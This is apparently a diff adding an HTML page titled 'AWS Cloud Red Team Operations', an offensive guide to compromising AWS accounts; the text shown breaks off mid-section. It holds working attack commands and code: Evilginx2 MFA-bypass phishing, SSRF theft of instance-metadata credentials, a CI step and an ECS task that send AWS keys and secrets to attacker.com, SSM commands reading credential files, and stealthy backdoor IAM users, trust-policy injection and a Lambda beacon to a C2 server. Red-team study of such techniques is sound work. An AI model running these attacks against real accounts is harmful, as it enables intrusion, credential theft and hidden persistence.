@@ -1,0 +1,1466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>AWS Cloud Red Team Operations</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --red:#E74C3C;--red-dark:#C0392B;
+  --dark:#1a252f;--darker:#111d27;--card:#1e2d3d;
+  --text:#ECF0F1;--muted:#8fa3b1;--border:#2e4057;
+  --yellow:#F39C12;--green:#27AE60;--blue:#3498DB;--purple:#9B59B6;
+}
+body{background:var(--darker);color:var(--text);font-family:"Segoe UI",monospace;line-height:1.6;overflow-x:hidden;font-size:15px;}
+.header{background:linear-gradient(135deg,var(--red),var(--red-dark));padding:14px 20px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:1000;box-shadow:0 3px 20px rgba(0,0,0,.5);}
+.header h1{color:#fff;font-size:1.4em;font-weight:900;letter-spacing:1px;}
+.vc{background:rgba(255,255,255,.15);padding:6px 14px;border-radius:6px;color:#fff;font-weight:700;font-size:.9em;white-space:nowrap;}
+
+/* MOBILE NAV - hidden on desktop */
+.mobile-nav{display:none;}
+
+/* DESKTOP LAYOUT */
+.layout{display:grid;grid-template-columns:230px 1fr;height:calc(100vh - 56px);}
+.sidebar{background:var(--dark);border-right:2px solid var(--border);overflow-y:auto;padding:10px 0;}
+.sb-head{color:var(--red);font-size:.72em;font-weight:900;text-transform:uppercase;letter-spacing:1.5px;padding:12px 14px 6px;border-left:3px solid var(--red);}
+.sb-item{padding:9px 14px;color:var(--muted);cursor:pointer;border-left:3px solid transparent;font-size:.87em;font-weight:600;transition:all .25s;}
+.sb-item:hover{background:rgba(231,76,60,.08);color:var(--red);border-left-color:var(--red);padding-left:20px;}
+.sb-item.active{background:rgba(231,76,60,.15);color:var(--red);border-left-color:var(--red);font-weight:900;}
+.content{overflow-y:auto;padding:32px 36px 60px;}
+.section{display:none;}.section.active{display:block;animation:fi .3s ease;}
+@keyframes fi{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+/* TYPOGRAPHY */
+.pt{color:var(--red);font-size:1.9em;font-weight:900;margin-bottom:6px;}
+.ps{color:var(--muted);font-size:.93em;margin-bottom:26px;padding-bottom:14px;border-bottom:1px solid var(--border);}
+
+/* CARDS */
+.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px;transition:border-color .3s,box-shadow .3s;position:relative;overflow:hidden;}
+.card::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--red),transparent);}
+.card:hover{border-color:var(--red);box-shadow:0 4px 20px rgba(231,76,60,.15);}
+.ct{color:var(--red);font-size:1.15em;font-weight:900;margin-bottom:8px;}
+.badge{display:inline-block;padding:3px 9px;border-radius:4px;font-size:.7em;font-weight:900;margin-bottom:10px;margin-right:5px;border:1px solid;}
+.bc{color:#ff4444;border-color:#ff4444;background:rgba(255,68,68,.12);}
+.bh{color:var(--yellow);border-color:var(--yellow);background:rgba(243,156,18,.12);}
+.bm{color:var(--blue);border-color:var(--blue);background:rgba(52,152,219,.12);}
+.bt{color:var(--purple);border-color:var(--purple);background:rgba(155,89,182,.12);}
+.cd{color:var(--muted);line-height:1.8;margin-bottom:12px;border-left:3px solid var(--red);padding:10px 12px;background:rgba(0,0,0,.2);border-radius:4px;font-size:.92em;}
+
+/* ACCORDIONS */
+.acc{border:1px solid var(--border);border-radius:6px;margin:8px 0;overflow:hidden;}
+.ah{padding:12px 14px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;font-weight:700;font-size:.88em;min-height:48px;transition:background .2s;user-select:none;}
+.ah:hover{background:rgba(231,76,60,.08);}
+.ah.bl{color:var(--blue);background:rgba(52,152,219,.06);}
+.ah.yl{color:var(--yellow);background:rgba(243,156,18,.06);}
+.ah.rd{color:var(--red);background:rgba(231,76,60,.06);}
+.ab{max-height:0;overflow:hidden;transition:max-height .35s ease,padding .2s;}
+.acc.open .ab{max-height:4000px;padding:14px;}
+.ar{transition:transform .3s;flex-shrink:0;margin-left:8px;}
+.acc.open .ar{transform:rotate(180deg);}
+
+/* CODE */
+pre{background:#0d1b22;border:1px solid var(--border);border-radius:6px;padding:13px;margin:10px 0;overflow-x:auto;font-size:.82em;-webkit-overflow-scrolling:touch;}
+code{color:#4ade80;font-family:"Courier New",monospace;white-space:pre;}
+.cm{color:#6b8fa3;}
+
+/* LISTS & TABLES */
+ul,ol{margin-left:18px;line-height:1.9;}
+li{color:var(--muted);margin-bottom:4px;font-size:.91em;}
+li strong{color:var(--text);}
+table{width:100%;border-collapse:collapse;margin:10px 0;font-size:.85em;}
+th{background:rgba(231,76,60,.2);color:var(--red);padding:9px 11px;text-align:left;font-weight:900;border:1px solid var(--border);}
+td{padding:8px 11px;border:1px solid var(--border);color:var(--muted);vertical-align:top;}
+tr:hover td{background:rgba(255,255,255,.03);}
+
+/* GRID */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:12px 0;}
+.ib{background:rgba(0,0,0,.2);border-radius:6px;padding:12px;border:1px solid var(--border);}
+.ib h4{font-size:.82em;font-weight:900;margin-bottom:7px;text-transform:uppercase;letter-spacing:.5px;}
+
+/* FOOTER */
+footer{background:var(--dark);border-top:2px solid var(--border);padding:26px;text-align:center;}
+.sl{display:flex;justify-content:center;gap:12px;margin-top:12px;flex-wrap:wrap;}
+.sl a{display:inline-flex;align-items:center;gap:5px;padding:8px 16px;background:rgba(231,76,60,.15);border:1px solid var(--red);border-radius:5px;color:var(--red);text-decoration:none;font-weight:700;transition:all .3s;}
+.sl a:hover{background:var(--red);color:#fff;}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--darker);}
+::-webkit-scrollbar-thumb{background:var(--red);border-radius:3px;}
+
+/* ===== MOBILE ===== */
+@media(max-width:900px){
+  /* Header */
+  .header{padding:10px 14px;flex-wrap:nowrap;gap:8px;}
+  .header h1{font-size:.95em;letter-spacing:0;}
+  .vc{font-size:.82em;padding:5px 10px;white-space:nowrap;}
+
+  /* Kill desktop layout */
+  .layout{display:block;height:auto;}
+  .sidebar{display:none;}
+  .content{
+    padding:12px 12px 60px;
+    overflow-y:visible;
+    max-height:none;
+  }
+
+  /* Mobile pill nav */
+  .mobile-nav{
+    display:flex;
+    overflow-x:auto;
+    gap:8px;
+    padding:10px 12px;
+    background:var(--dark);
+    border-bottom:2px solid var(--border);
+    position:sticky;
+    top:48px;
+    z-index:999;
+    -webkit-overflow-scrolling:touch;
+    scrollbar-width:none;
+    min-height:52px;
+    align-items:center;
+  }
+  .mobile-nav::-webkit-scrollbar{display:none;}
+  .mp{
+    flex-shrink:0;
+    padding:9px 16px;
+    background:rgba(231,76,60,.12);
+    border:1.5px solid var(--red);
+    border-radius:22px;
+    color:var(--red);
+    font-size:.85em;
+    font-weight:700;
+    cursor:pointer;
+    white-space:nowrap;
+    min-height:38px;
+    display:flex;
+    align-items:center;
+    transition:all .2s;
+    -webkit-tap-highlight-color:transparent;
+  }
+  .mp.active{background:var(--red);color:#fff;border-color:var(--red);}
+
+  /* Typography */
+  .pt{font-size:1.5em;margin-bottom:4px;}
+  .ps{font-size:.88em;margin-bottom:18px;}
+
+  /* Cards */
+  .card{padding:14px;margin-bottom:14px;}
+  .ct{font-size:1.05em;}
+  .cd{font-size:.88em;padding:9px 11px;}
+
+  /* FORCE single column grid */
+  .g2{
+    display:flex !important;
+    flex-direction:column !important;
+    gap:10px;
+  }
+  .ib{width:100% !important;}
+
+  /* Accordions - bigger tap targets */
+  .acc{margin:7px 0;}
+  .ah{
+    min-height:52px;
+    padding:14px 13px;
+    font-size:.88em;
+    line-height:1.3;
+  }
+  .ab{padding:0;}
+  .acc.open .ab{padding:12px;}
+
+  /* Code blocks */
+  pre{
+    font-size:.74em;
+    padding:11px;
+    overflow-x:auto;
+    -webkit-overflow-scrolling:touch;
+    word-break:normal;
+    white-space:pre;
+  }
+  code{word-break:normal;white-space:pre;}
+
+  /* Tables */
+  table{
+    display:block;
+    overflow-x:auto;
+    -webkit-overflow-scrolling:touch;
+    font-size:.8em;
+    white-space:nowrap;
+  }
+  th,td{padding:8px 10px;}
+
+  /* Badges */
+  .badge{font-size:.68em;padding:3px 8px;}
+
+  /* Lists */
+  ul,ol{margin-left:14px;}
+  li{font-size:.88em;margin-bottom:3px;}
+
+  /* Footer */
+  footer{padding:20px 14px;}
+  .sl{gap:10px;}
+  .sl a{padding:7px 14px;font-size:.88em;}
+
+  /* Disable hover transform on touch */
+  .card:hover{transform:none;}
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>&#x2694;&#xFE0F; AWS Cloud Red Team Operations</h1>
+  <div class="vc">&#x1F441; <span id="vc">0</span></div>
+</div>
+
+<!-- MOBILE PILL NAV -->
+<div class="mobile-nav">
+  <button class="mp active" onclick="nav('overview',this)">Overview</button>
+  <button class="mp" onclick="nav('initial',this)">Initial Access</button>
+  <button class="mp" onclick="nav('execution',this)">Execution</button>
+  <button class="mp" onclick="nav('persistence',this)">Persistence</button>
+  <button class="mp" onclick="nav('cred',this)">Credentials</button>
+  <button class="mp" onclick="nav('discovery',this)">Discovery</button>
+  <button class="mp" onclick="nav('lateral',this)">Lateral Move</button>
+  <button class="mp" onclick="nav('iam',this)">IAM</button>
+  <button class="mp" onclick="nav('vpc',this)">VPC</button>
+  <button class="mp" onclick="nav('ec2',this)">EC2</button>
+  <button class="mp" onclick="nav('lambda',this)">Lambda</button>
+  <button class="mp" onclick="nav('containers',this)">Containers</button>
+  <button class="mp" onclick="nav('s3',this)">S3</button>
+  <button class="mp" onclick="nav('rds',this)">RDS</button>
+  <button class="mp" onclick="nav('ebs',this)">EBS</button>
+  <button class="mp" onclick="nav('secrets',this)">Secrets Mgr</button>
+  <button class="mp" onclick="nav('sso',this)">SSO</button>
+  <button class="mp" onclick="nav('security',this)">Security Svc</button>
+</div>
+
+<div class="layout">
+
+<!-- DESKTOP SIDEBAR -->
+<aside class="sidebar">
+  <div class="sb-head">&#x1F3AF; Attack Framework</div>
+  <div class="sb-item active" onclick="nav('overview',this)">&#x1F4CA; Overview</div>
+  <div class="sb-item" onclick="nav('initial',this)">&#x1F6AA; Initial Access</div>
+  <div class="sb-item" onclick="nav('execution',this)">&#x26A1; Execution</div>
+  <div class="sb-item" onclick="nav('persistence',this)">&#x1F501; Persistence</div>
+  <div class="sb-item" onclick="nav('cred',this)">&#x1F511; Credential Access</div>
+  <div class="sb-item" onclick="nav('discovery',this)">&#x1F50D; Discovery</div>
+  <div class="sb-item" onclick="nav('lateral',this)">&#x2194;&#xFE0F; Lateral Movement</div>
+  <div class="sb-head">&#x2601;&#xFE0F; AWS Services</div>
+  <div class="sb-item" onclick="nav('iam',this)">&#x1F510; IAM</div>
+  <div class="sb-item" onclick="nav('vpc',this)">&#x1F310; VPC</div>
+  <div class="sb-item" onclick="nav('ec2',this)">&#x1F4BB; EC2</div>
+  <div class="sb-item" onclick="nav('lambda',this)">&#x2699;&#xFE0F; Lambda</div>
+  <div class="sb-item" onclick="nav('containers',this)">&#x1F4E6; Containers</div>
+  <div class="sb-item" onclick="nav('s3',this)">&#x1FAA3; S3</div>
+  <div class="sb-item" onclick="nav('rds',this)">&#x1F4CA; RDS</div>
+  <div class="sb-item" onclick="nav('ebs',this)">&#x1F4BE; EBS</div>
+  <div class="sb-item" onclick="nav('secrets',this)">&#x1F512; Secrets Manager</div>
+  <div class="sb-item" onclick="nav('sso',this)">&#x1F464; SSO</div>
+  <div class="sb-item" onclick="nav('security',this)">&#x1F6E1;&#xFE0F; Security Services</div>
+</aside>
+
+<main class="content">
+
+<!-- ========== OVERVIEW ========== -->
+<section id="overview" class="section active">
+<h2 class="pt">AWS Cloud Red Team Operations</h2>
+<p class="ps">Comprehensive adversarial guide covering all phases from initial access to full account compromise across 11 AWS services</p>
+<div class="card">
+<div class="ct">&#x1F5FA;&#xFE0F; Attack Surface Overview</div>
+<div class="cd">AWS environments expose a massive distributed attack surface spanning identity (IAM/SSO), compute (EC2, Lambda, ECS/EKS), storage (S3, EBS), databases (RDS), networking (VPC), secrets management, and logging/monitoring services. A single misconfiguration can chain into full account compromise.</div>
+<div class="g2">
+<div class="ib"><h4 style="color:var(--red)">Primary Objectives</h4><ul>
+  <li>Persistent access to AWS account</li>
+  <li>Escalate to AdministratorAccess</li>
+  <li>Exfiltrate secrets, DBs, source code</li>
+  <li>Cross-account compromise</li>
+  <li>Disable detection and monitoring</li>
+</ul></div>
+<div class="ib"><h4 style="color:var(--blue)">Key Attack Tools</h4><ul>
+  <li><strong>Pacu</strong> — AWS exploitation framework</li>
+  <li><strong>PMapper</strong> — Priv-esc graph analysis</li>
+  <li><strong>ScoutSuite</strong> — Multi-cloud auditor</li>
+  <li><strong>Cloudsplaining</strong> — IAM deep analysis</li>
+  <li><strong>Prowler</strong> — CIS benchmark scanner</li>
+  <li><strong>CloudMapper</strong> — Network visualization</li>
+</ul></div>
+</div>
+</div>
+<div class="card">
+<div class="ct">&#x1F4CB; MITRE ATT&amp;CK Coverage</div>
+<table>
+<tr><th>Tactic</th><th>Key Techniques</th></tr>
+<tr><td>Initial Access</td><td>T1566 Phishing, T1552 Credentials, T1530 Public Data, T1195 Supply Chain</td></tr>
+<tr><td>Execution</td><td>T1648 Serverless, T1651 SSM, T1610 Container Deployment</td></tr>
+<tr><td>Persistence</td><td>T1098 Account Manipulation, T1136 New Account, T1053 Scheduled Task</td></tr>
+<tr><td>Credential Access</td><td>T1552.005 IMDS, T1555 Secrets, T1552.001 Credential Files</td></tr>
+<tr><td>Discovery</td><td>T1087.004 IAM Enum, T1580 Resource Discovery, T1046 Network Scan</td></tr>
+<tr><td>Lateral Movement</td><td>T1550 Pass Role, T1548 Privilege Escalation, T1550.001 Cross-Account</td></tr>
+</table>
+</div>
+</section>
+
+<!-- ========== INITIAL ACCESS ========== -->
+<section id="initial" class="section">
+<h2 class="pt">&#x1F6AA; Initial Access</h2>
+<p class="ps">Obtaining the first foothold into an AWS environment</p>
+
+<div class="card"><div class="ct">1. IAM Access Key Leakage</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1552.001</span>
+<div class="cd">Access keys committed to GitHub, baked into Docker images, exposed in CI/CD logs, or hardcoded in source code. The most common initial access vector — keys persist until explicitly rotated.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F50D; Discovery &amp; Exploitation <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Scan Git history</span>
+trufflehog git https://github.com/target/repo --only-verified
+gitleaks detect --source=/path/to/repo -v
+
+<span class="cm"># GitHub dork</span>
+AKIA site:github.com target.com
+
+<span class="cm"># Validate found key</span>
+aws sts get-caller-identity   --access-key-id AKIAIOSFODNN7EXAMPLE   --secret-access-key wJalrXUtnFEMI/K7MDENG
+
+<span class="cm"># Enumerate permissions</span>
+USER=$(aws iam get-user --query "User.UserName" -o text)
+aws iam list-attached-user-policies --user-name $USER
+aws iam list-user-policies --user-name $USER</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. Phishing + MFA Bypass via Reverse Proxy</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1566</span>
+<div class="cd">Clone AWS console login. Use Evilginx2 reverse proxy to capture session cookies post-MFA. Captured cookie grants full console access regardless of MFA.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F3A3; Attack Setup <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Evilginx2 setup with AWS phishlet</span>
+./evilginx2 -p phishlets/
+phishlets hostname aws your-phish-domain.com
+phishlets enable aws
+lures create aws && lures get-url 0
+
+<span class="cm"># Once session cookie captured:</span>
+<span class="cm"># Use in browser DevTools > Application > Cookies</span>
+<span class="cm"># Or convert to CLI credentials via federation endpoint</span></code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. SSRF to IMDS Credential Theft</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1552.005</span>
+<div class="cd">Exploit SSRF in web app hosted on EC2/ECS to query Instance Metadata Service and steal attached IAM role credentials.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F534; IMDSv1 — No Auth Required <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Via vulnerable SSRF parameter</span>
+GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+
+<span class="cm"># Export returned credentials</span>
+export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=AQoEXAMPLE...
+aws sts get-caller-identity</code></pre>
+</div></div>
+<div class="acc"><div class="ah yl" onclick="tog(this)">&#x1F7E1; IMDSv2 — Token Required (bypassable) <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Step 1: PUT to get session token (if SSRF allows custom headers)</span>
+PUT http://169.254.169.254/latest/api/token
+Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+<span class="cm"># Step 2: Use token to fetch credentials</span>
+GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
+Header: X-aws-ec2-metadata-token: TOKEN_FROM_STEP1</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">4. Public S3 Bucket Data Mining</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1530</span>
+<div class="cd">Enumerate publicly accessible S3 buckets: source code, DB dumps, .env files, private keys, backups, PII.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4E5; Discovery &amp; Loot <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Unauthenticated access</span>
+aws s3 ls s3://target-bucket --no-sign-request
+aws s3 sync s3://target-bucket ./loot --no-sign-request
+
+<span class="cm"># Bulk discovery</span>
+s3scanner scan --buckets-file wordlist.txt
+
+<span class="cm"># Hunt sensitive files</span>
+find ./loot -name "*.env" -o -name "*.pem" -o -name "*.sql" |   xargs grep -l "password\|secret\|key" 2>/dev/null</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">5. Cognito Identity Pool Abuse</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1078.004</span>
+<div class="cd">Exploit misconfigured Cognito Identity Pools allowing unauthenticated access to obtain AWS temporary credentials.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F3AF; Exploitation <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Find Identity Pool ID in app JS/source</span>
+grep -r "us-east-1:" app/ | grep "identity"
+
+<span class="cm"># Get unauthenticated identity</span>
+aws cognito-identity get-id   --account-id 123456789012   --identity-pool-id us-east-1:xxxx-xxxx-xxxx
+
+<span class="cm"># Get temporary AWS credentials</span>
+aws cognito-identity get-credentials-for-identity   --identity-id us-east-1:xxxx-xxxx-xxxx</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">6. CI/CD Supply Chain Compromise</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1195</span>
+<div class="cd">Target CI/CD pipelines with AWS deployment roles (GitHub Actions, Jenkins, CodeBuild, Terraform Cloud) to steal credentials via malicious steps or dependencies.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F6E0;&#xFE0F; CI/CD Attack Vectors <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Malicious GitHub Actions step in PR</span>
+- name: run-tests
+  run: |
+    curl -s "https://attacker.com/c"       -d "k=$AWS_ACCESS_KEY_ID&s=$AWS_SECRET_ACCESS_KEY&t=$AWS_SESSION_TOKEN"
+
+<span class="cm"># Jenkins script console credential dump</span>
+<span class="cm"># Navigate to /script then run:</span>
+println(jenkins.model.Jenkins.instance
+  .getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0]
+  .getCredentials())</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== EXECUTION ========== -->
+<section id="execution" class="section">
+<h2 class="pt">&#x26A1; Execution</h2>
+<p class="ps">Running attacker-controlled code within the AWS environment</p>
+
+<div class="card"><div class="ct">1. Lambda Code Injection</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1648</span>
+<div class="cd">Create or hijack Lambda functions with powerful IAM roles. UpdateFunctionCode alone (no PassRole) is enough to inject into existing functions.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F195; Create Function with Admin Role <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>cat > /tmp/pwn.py << 'EOF'
+import boto3, json
+def handler(event, context):
+    iam = boto3.client("iam")
+    key = iam.create_access_key(UserName="admin")
+    return key["AccessKey"]
+EOF
+cd /tmp && zip payload.zip pwn.py
+
+aws lambda create-function   --function-name health-check-svc   --runtime python3.12   --role arn:aws:iam::ACCOUNT:role/AdminRole   --handler pwn.handler   --zip-file fileb:///tmp/payload.zip
+
+aws lambda invoke --function-name health-check-svc /tmp/out.json
+cat /tmp/out.json</code></pre>
+</div></div>
+<div class="acc"><div class="ah yl" onclick="tog(this)">&#x1F504; Hijack Existing Function (UpdateFunctionCode only) <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Find functions with admin roles</span>
+aws lambda list-functions   --query "Functions[*].[FunctionName,Role]" -o table
+
+<span class="cm"># Overwrite with payload</span>
+aws lambda update-function-code   --function-name existing-admin-function   --zip-file fileb:///tmp/payload.zip
+
+aws lambda invoke --function-name existing-admin-function /tmp/result.json</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. SSM Run Command / Session Manager</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1651</span>
+<div class="cd">Execute commands on any EC2 instance with SSM Agent installed. No SSH, no open ports, no key pairs. Works on private subnet instances.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F5A5;&#xFE0F; Remote Execution <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># List managed instances</span>
+aws ssm describe-instance-information   --query "InstanceInformationList[*].[InstanceId,PlatformName,IPAddress]" -o table
+
+<span class="cm"># Run on specific instance</span>
+aws ssm send-command   --instance-ids i-1234567890abcdef0   --document-name "AWS-RunShellScript"   --parameters commands=["id","cat /etc/passwd","env","cat ~/.aws/credentials"]
+
+<span class="cm"># Run on ALL Linux instances</span>
+aws ssm send-command   --targets "Key=platformType,Values=Linux"   --document-name "AWS-RunShellScript"   --parameters commands=["curl http://attacker.com/?h=$(hostname)"]
+
+<span class="cm"># Interactive shell</span>
+aws ssm start-session --target i-1234567890abcdef0</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. ECS Fargate Task Execution</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1610</span>
+<div class="cd">Run a malicious container as ECS task with any passable admin role. No servers needed, runs and terminates cleanly.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4E6; Malicious Container <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws ecs register-task-definition   --family exfil-task   --task-role-arn arn:aws:iam::ACCOUNT:role/AdminRole   --execution-role-arn arn:aws:iam::ACCOUNT:role/ecsTaskExecutionRole   --container-definitions '[{"name":"c","image":"amazonlinux:2",
+    "command":["sh","-c","aws secretsmanager list-secrets > /tmp/o; curl -d @/tmp/o http://attacker.com/"],
+    "essential":true}]'   --cpu 256 --memory 512 --network-mode awsvpc
+
+aws ecs run-task   --cluster default --task-definition exfil-task   --launch-type FARGATE   --network-configuration "awsvpcConfiguration={subnets=[subnet-xxx],assignPublicIp=ENABLED}"</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">4. CloudFormation Stack Execution</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1648</span>
+<div class="cd">Deploy a CFN stack with an elevated role to create IAM backdoors or resources. One API call deploys the whole attack.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4CB; Template-Based RCE <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>cat > /tmp/pwn.json << 'EOF'
+{
+  "Resources": {
+    "BdUser": {"Type":"AWS::IAM::User","Properties":{"UserName":"svc-monitoring"}},
+    "BdKey":  {"Type":"AWS::IAM::AccessKey","Properties":{"UserName":{"Ref":"BdUser"}}},
+    "BdPol":  {"Type":"AWS::IAM::Policy","Properties":{
+      "PolicyName":"FullAccess",
+      "PolicyDocument":{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]},
+      "Users":[{"Ref":"BdUser"}]}}
+  }
+}
+EOF
+
+aws cloudformation create-stack   --stack-name patch-automation   --template-body file:///tmp/pwn.json   --capabilities CAPABILITY_NAMED_IAM   --role-arn arn:aws:iam::ACCOUNT:role/CFNAdminRole</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">5. Glue Dev Endpoint SSH Shell</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1059</span>
+<div class="cd">Create a Glue Dev Endpoint with admin role and SSH public key. Get persistent shell running as that role.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F41B; Glue Shell <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Requires: iam:PassRole + glue:CreateDevEndpoint</span>
+aws glue create-dev-endpoint   --endpoint-name "data-engineering-dev"   --role-arn arn:aws:iam::ACCOUNT:role/AdminRole   --public-key "ssh-rsa AAAA... attacker@local"
+
+<span class="cm"># Wait ~10 min, then SSH in as the admin role</span>
+ssh -i ~/.ssh/attacker_key glue@PUBLIC_ADDRESS</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== PERSISTENCE ========== -->
+<section id="persistence" class="section">
+<h2 class="pt">&#x1F501; Persistence</h2>
+<p class="ps">Maintaining long-term stealthy access to AWS environments</p>
+
+<div class="card"><div class="ct">1. IAM Access Key Backdoor</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1098.001</span>
+<div class="cd">Create extra access keys for admin users. Survive password resets, MFA changes, and most incident response steps. The #1 persistence mechanism in real AWS breaches.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F511; Key Creation <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Find admin users</span>
+aws iam list-users --query "Users[*].UserName" -o text |   tr '	' '
+' | while read u; do
+    p=$(aws iam list-attached-user-policies --user-name $u       --query "AttachedPolicies[*].PolicyName" -o text)
+    echo "$u: $p"
+  done
+
+<span class="cm"># Create backdoor key (persists until manually deleted)</span>
+aws iam create-access-key --user-name admin-user</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. Stealth IAM User Creation</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1136.003</span>
+<div class="cd">Create a new IAM user named to blend with service accounts. Attach AdministratorAccess for permanent console and API access.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F464; Backdoor User <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws iam create-user --user-name aws-systems-health-agent
+aws iam attach-user-policy   --user-name aws-systems-health-agent   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam create-access-key --user-name aws-systems-health-agent
+aws iam create-login-profile   --user-name aws-systems-health-agent   --password 'S3cur3P@ss2024!'   --no-password-reset-required</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. Role Trust Policy Backdoor</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1098.003</span>
+<div class="cd">Modify an admin role trust policy to allow attacker account to assume it anytime. Role still works normally — very hard to detect.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F504; Trust Injection <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws iam update-assume-role-policy --role-name AdminRole   --policy-document '{
+    "Version":"2012-10-17",
+    "Statement":[
+      {"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::VICTIM:root"},"Action":"sts:AssumeRole"},
+      {"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ATTACKER_ACCT:root"},"Action":"sts:AssumeRole"}
+    ]
+  }'
+
+<span class="cm"># From attacker account anytime:</span>
+aws sts assume-role   --role-arn arn:aws:iam::VICTIM_ACCT:role/AdminRole   --role-session-name maintenance</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">4. Lambda + EventBridge Scheduled Beacon</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1053.005</span>
+<div class="cd">Deploy a Lambda cron that beacons home every 6 hours, collecting secrets and checking in with C2. Named to mimic legitimate operational tasks.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x23F1;&#xFE0F; Scheduled Beacon <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>cat > /tmp/beacon.py << 'EOF'
+import urllib.request, boto3, json
+def handler(event, context):
+    secrets = [s["Name"] for s in
+      boto3.client("secretsmanager").list_secrets()["SecretList"]]
+    urllib.request.urlopen(urllib.request.Request(
+      "https://attacker.com/c2",
+      data=json.dumps(secrets).encode(), method="POST"))
+EOF
+cd /tmp && zip beacon.zip beacon.py
+
+aws lambda create-function --function-name system-metrics-collector   --runtime python3.12 --role arn:aws:iam::ACCOUNT:role/AdminRole   --handler beacon.handler --zip-file fileb:///tmp/beacon.zip
+
+aws events put-rule --name ops-health-check   --schedule-expression "rate(6 hours)" --state ENABLED
+aws events put-targets --rule ops-health-check   --targets "Id=1,Arn=arn:aws:lambda:us-east-1:ACCOUNT:function:system-metrics-collector"</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">5. EC2 User Data Implant</div>
